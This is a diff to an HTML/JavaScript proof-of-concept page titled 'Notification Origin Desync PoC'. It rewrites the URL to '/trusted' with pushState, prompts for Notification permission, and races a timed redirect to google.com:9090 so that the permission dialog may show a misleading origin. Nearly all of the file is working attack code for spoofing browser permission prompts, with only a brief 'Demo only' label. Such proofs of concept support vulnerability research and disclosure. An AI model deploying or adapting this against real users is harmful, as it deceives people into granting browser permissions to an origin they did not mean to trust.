@@ -1,19 +1,105 @@
-<button id="start">Start PoC</button>
-<button id="req" hidden>Request Notification</button>
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Notification Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+}
+
+button {
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+
+#panel {
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
+}
+
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+}
+</style>
+</head>
+
+<body>
+
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Request Notification</h2>
+  <p>Tap the button below to request Notification permission.</p>
+
+  <button onclick="requestNotif()">Request Notification</button>
+  <p id="output">Permission: -</p>
+
+  <div class="notice">
+    Demo only — observe origin shown in permission dialog
+  </div>
+</div>
 
 <script>
-start.onclick = () => {
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
+
+/*
+ * Permission API
+ */
+function requestNotif() {
+  if (!('Notification' in window)) {
+    output.textContent = 'Not supported';
+    return;
+  }
+
+  Notification.requestPermission().then(result => {
+    output.textContent = result;
+  });
+}
+
+/*
+ * Step 1:
+ * User gesture + trusted-looking URL
+ */
+trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
-  req.hidden = false;
+  panel.style.display = 'block';
 };
 
-req.onclick = () => {
-  Notification.requestPermission();
-};
-
+/*
+ * Step 2:
+ * Navigation race during permission flow
+ */
 window.addEventListener('pageshow', () => {
-  setTimeout(() => {
-    location.href = 'https://google.com:9090';
-  }, 80);
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
 });
 </script>
+
+</body>
+</html>
